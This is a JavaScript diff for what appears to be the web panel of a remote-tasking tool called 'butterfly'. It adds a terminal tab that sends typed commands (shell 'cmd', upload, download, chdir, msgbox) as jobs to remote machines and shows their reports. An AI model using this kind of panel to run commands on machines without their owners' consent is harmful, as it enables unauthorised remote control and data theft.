@@ -15,6 +15,10 @@ function formatBytes(bytes, decimals = 2) {
     return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
 
+function isWrappedWith(s1, s2) {
+    return s1.startsWith(s2) && s1.endsWith(s2)
+}
+
 // MODAL
 function showModal(modalId) {
     $(modalId).removeClass('hidden');
@@ -464,4 +468,56 @@ function setupBoostToggle() {
             alert('Failed to create job!');
         });
     })
+}
+
+function initTabs() {
+    $('.tabs button').click(switchTab);
+
+    $('#history-tab').one('click', function () {
+        createJobsTable();
+    });
+    $('#uploads-tab').one('click', function () {
+        createUploadsTable();
+    });
+    $('#terminal-tab').one('click', function () {
+        terminal = $('#terminal-body').terminal(function (command) {
+            terminal.pause();
+            if (command === '') {
+                return;
+            }
+            const jobTypes = ['upload', 'download', 'chdir', 'sleep'];
+            let job = {todo: '', is_done: false};
+            // TODO: maybe check individually command args length?
+            if (command.startsWith('msgbox')) {
+                let vals = command.match(/\w+|"[^"]+"/g);
+                if (vals.length < 3 || !isWrappedWith(vals[1], '"') && !isWrappedWith(vals[2], '"')) {
+                    terminal.error("Wrong command syntax!");
+                    terminal.resume();
+                    return;
+                }
+                job.todo = command;
+            } else if (jobTypes.some(t => command.startsWith(t))) {
+                job.todo = command;
+            } else {
+                job.todo = 'cmd ' + command;
+            }
+            createJobApi(job, function (data) {
+                retrieveReport(data.id, rep => {
+                    terminal.echo(rep);
+                    terminal.resume();
+                }, function () {
+                    terminal.error('Failed to retrieve report!');
+                    terminal.resume();
+                });
+                addJobToTable(data);
+            }, function () {
+                terminal.error('Failed to create job!');
+                terminal.resume();
+            });
+        }, {
+            greetings: 'Welcome to butterfly!',
+            height: 570
+        });
+    });
+    $('.active-tab').trigger('click');
 }
